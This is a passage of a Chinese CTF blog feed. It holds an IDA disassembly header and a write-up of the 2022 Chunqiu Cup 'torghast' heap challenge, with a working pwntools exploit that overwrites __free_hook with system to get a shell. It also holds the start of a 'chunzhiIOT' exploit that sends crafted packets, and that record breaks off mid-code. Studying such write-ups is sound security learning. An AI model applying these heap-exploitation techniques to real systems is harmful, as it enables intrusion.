function_\">Disassembler</span> <span class=\"params\">(IDA)</span>      |</span><br><span class=\"line\">.text:00401000 ; |           Copyright (c) <span class=\"number\">2020</span> Hex-Rays, &lt;support@hex-rays.com&gt;           |</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; |                      License info: <span class=\"number\">50</span><span class=\"number\">-5947</span><span class=\"number\">-5F</span>4E<span class=\"number\">-42</span>                      |</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; |                      P.Y.G Team, Personal license                       |</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; +-------------------------------------------------------------------------+</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ;</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Input SHA256 : F6BCC742755C60202D85EDD7307567103C8804F2249D16591040A3390E571CBE</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Input MD5    : <span class=\"number\">3</span>D47DDF04CC6A8120C400A5F304E3ED6</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Input CRC32  : <span class=\"number\">4F</span>14BDF8</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span></span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; File Name   : C:\\Users\\<span class=\"number\">32644</span>\\Desktop\\reverse\\csaw2013reversing2\\<span class=\"number\">0453</span>d21297a743e199d8a7de75179e52 (<span class=\"number\">1</span>).exe</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Format      : Portable executable <span class=\"keyword\">for</span> <span class=\"number\">80386</span> (PE)</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Imagebase   : <span class=\"number\">400000</span></span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Timestamp   : <span class=\"number\">54123</span>A17 (Fri Sep <span class=\"number\">12</span> <span class=\"number\">00</span>:<span class=\"number\">11</span>:<span class=\"number\">03</span> <span class=\"number\">2014</span>)</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Section <span class=\"number\">1.</span> (virtual address <span class=\"number\">00001000</span>)</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Virtual size                  : <span class=\"number\">000044</span>D2 (  <span class=\"number\">17618.</span>)</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Section size in file          : <span class=\"number\">00004600</span> (  <span class=\"number\">17920.</span>)</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Offset to raw data <span class=\"keyword\">for</span> section: <span class=\"number\">00000400</span></span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Flags <span class=\"number\">60000020</span>: Text Executable Readable</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Alignment     : <span class=\"keyword\">default</span></span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; PDB File Name : C:\\Users\\exploitation\\documents\\visual studio <span class=\"number\">2010</span>\\Projects\\csaw2013reversing2\\Release\\csaw2013reversing2.pdb</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; OS type         :  MS Windows</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span> ; Application type:  Executable <span class=\"number\">32b</span>it</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span></span><br><span class=\"line\">.text:<span class=\"number\">00401000</span>                 <span class=\"number\">.686</span>p</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span>                 .mmx</span><br><span class=\"line\">.text:<span class=\"number\">00401000</span>                 .model flat</span><br><span class=\"line\">...</span><br><span class=\"line\">.text:<span class=\"number\">00405600</span> _text           ends</span><br><span class=\"line\">.text:<span class=\"number\">00405600</span></span><br><span class=\"line\">.idata:<span class=\"number\">00406000</span> ; Section <span class=\"number\">2.</span> (virtual address <span class=\"number\">00006000</span>)</span><br></pre></td></tr></table></figure>\n<p>这个两个基址，其实是相对地址，也就是关于镜像基址（BaseOfImage）的偏移</p>\n",
            "tags": [
                "逆向"
            ]
        },
        {
            "id": "http://example.com/2022/05/10/torghast/",
            "url": "http://example.com/2022/05/10/torghast/",
            "title": "torghast",
            "date_published": "2022-05-10T10:29:08.000Z",
            "content_html": "<h1 id=\"202205-春秋杯-pwn-torghast\"><a class=\"markdownIt-Anchor\" href=\"#202205-春秋杯-pwn-torghast\">#</a> 202205 春秋杯 pwn torghast</h1>\n<h2 id=\"环境及保护\"><a class=\"markdownIt-Anchor\" href=\"#环境及保护\">#</a> 环境及保护</h2>\n<p>2.31 的堆题目</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ checksec --file=pwn</span><br><span class=\"line\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span><br><span class=\"line\">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols\t  No\t0\t\t2\t\tpwn</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ strings libc-2.31.so | grep ubuntu</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.</span><br><span class=\"line\">&lt;https://bugs.launchpad.net/ubuntu/+<span class=\"built_in\">source</span>/glibc/+bugs&gt;.</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ </span><br></pre></td></tr></table></figure>\n<h2 id=\"题目分析\"><a class=\"markdownIt-Anchor\" href=\"#题目分析\">#</a> 题目分析</h2>\n<h2 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<p>我们要想正常做堆题，就必须获得 GM 权限，通过 use magic，造成整数溢出（将 mp 弄成负数），然后闯关，获得 GM 权限</p>\n<p>题目存在空字符的 off-by-one, 但是因为是高版本的 glibc，就导致了修改 chunksize 最低位，触发 unlink 向前合并失效</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* consolidate backward */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">      prevsize = prev_size (p);</span><br><span class=\"line\">      size += prevsize;</span><br><span class=\"line\">      p = chunk_at_offset(p, -((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class=\"line\">        malloc_printerr (<span class=\"string\">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class=\"line\">      unlink_chunk (av, p);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>这里检查了前 chunk 的 size 与我们释放堆块的 prev_size 是否相等，我 i 们想利用堆块合并构造 overlap 就无效了。一般来说绕过方式是在 chunk 内部伪造一个 chunk, 但是前提是我们可以知道堆地址。</p>\n<p>首先物品们通过 unsortedbins 泄露出 libc 以及 chunksize，就可以后面继续 overlap 了</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp:</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/home/dreamcat/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getGM</span>():</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;GM&quot;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;GM&quot;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;GM&quot;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;GM&quot;</span>,<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Welcome&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;get the GM permission!!!&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">selectuser</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;User?&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manage</span>():</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">back</span>():</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size,text</span>):</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Id&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> size&gt;=<span class=\"number\">1000</span>:</span><br><span class=\"line\">        r.sendafter(<span class=\"string\">&quot;Size&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;Size&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&quot;Data&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,text</span>):</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Change&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&quot;Log&quot;</span>,text)   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;lete&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    back()</span><br><span class=\"line\">    selectuser(idx)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Log:\\nXXXXXXXX&quot;</span>)</span><br><span class=\"line\">    addr = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    manage()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> addr</span><br><span class=\"line\"></span><br><span class=\"line\">getGM()</span><br><span class=\"line\"><span class=\"comment\">#leak the libc</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class=\"line\">manage()</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x410</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x420</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x4f0</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x410</span>,<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">7</span>)</span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x4f0</span>,<span class=\"string\">b&#x27;e&#x27;</span>*<span class=\"number\">7</span>)</span><br><span class=\"line\">edit(<span class=\"number\">5</span>,<span class=\"string\">b&#x27;X&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">edit(<span class=\"number\">6</span>,<span class=\"string\">b&#x27;X&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">libc = show(<span class=\"number\">6</span>)-<span class=\"number\">0x1ecbe0</span></span><br><span class=\"line\">heap = show(<span class=\"number\">5</span>)</span><br><span class=\"line\">malloc_hook=libc +<span class=\"number\">0x1ecb70</span></span><br><span class=\"line\">free_hook =libc + <span class=\"number\">0x1eee48</span></span><br><span class=\"line\">system = libc + <span class=\"number\">0x0522c0</span></span><br><span class=\"line\">onegadget = <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libc : &quot;</span>,<span class=\"built_in\">hex</span>(libc))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;heap : &quot;</span>,<span class=\"built_in\">hex</span>(heap))</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x3f0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0x420</span>))</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x421</span>)+p64(heap-<span class=\"number\">0x420</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">6</span>)</span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x3e0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">7</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;x&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,p64(free_hook))</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;/bin/sh\\x00\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x20</span>,p64(system))</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/05/10/chunzhiIOT/",
            "url": "http://example.com/2022/05/10/chunzhiIOT/",
            "title": "chunzhiIOT",
            "date_published": "2022-05-10T10:25:33.000Z",
            "content_html": "<h1 id=\"202205-春秋杯-个人赛-chunzhiiot\"><a class=\"markdownIt-Anchor\" href=\"#202205-春秋杯-个人赛-chunzhiiot\">#</a> 202205 春秋杯 个人赛 ，chunzhiIOT</h1>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc= ELF(<span class=\"string\">&#x27;/home/dreamcat/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getadmin</span>():</span><br><span class=\"line\">\tpayload = <span class=\"string\">&quot;DEV /root/src HTTP/1.1 \\r\\nrotartsinimda\\x00  &quot;</span></span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Waiting Package...&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dbg</span>():</span><br><span class=\"line\">\tgdb.attach(r)</span><br><span class=\"line\">\tpause(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size,text</span>):</span><br><span class=\"line\">\t<span class=\"comment\">#payload = &quot;POST /root/src HTTP/1.1 \\r\\n\\x01&amp;&#123;&#125;&amp;&#123;&#125;&amp;&#123;&#125;&quot;.format(str(idx),str(size),text)</span></span><br><span class=\"line\">\tpayload = <span class=\"string\">b&quot;POST /root/src HTTP/1.1 \\r\\n\\x01&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= <span class=\"built_in\">bytes</span>(<span class=\"built_in\">str</span>(idx),encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)+<span class=\"string\">b&quot;&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= <span class=\"built_in\">bytes</span>(<span class=\"built_in\">str</span>(size),encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)+<span class=\"string\">b&quot;&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= text</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Waiting Package&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,text</span>):</span><br><span class=\"line\">\tpayload = <span class=\"string\">b&quot;POST /root/src HTTP/1.1 \\r\\n\\x02&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= <span class=\"built_in\">bytes</span>(<span class=\"built_in\">str</span>(idx),encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)+<span class=\"string\">b&quot;&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= text</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Waiting Package&quot;</span>,payload)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tpayload = <span class=\"string\">b&quot;POST /root/src HTTP/1.1 \\r\\n\\x03&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= <span class=\"built_in\">bytes</span>(<span class=\"built_in\">str</span>(idx),encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)+<span class=\"string\">b&quot;&amp;&quot;</span></span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Waiting Package&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tpayload = <span class=\"string\">b&quot;POST /root/src HTTP/1.1 \\r\\n\\x04&amp;&quot;</span></span><br><span class=\"line\">\tpayload+= <span class=\"built_in\">bytes</span>(<span class=\"built_in\">str</span>(idx),encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)+<span class=\"string\">b&quot;&amp;&quot;</span></span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Waiting Package&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;b malloc&#x27;</span>)</span><br><span class=\"line\">getadmin()</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x420</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">16</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x430</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span 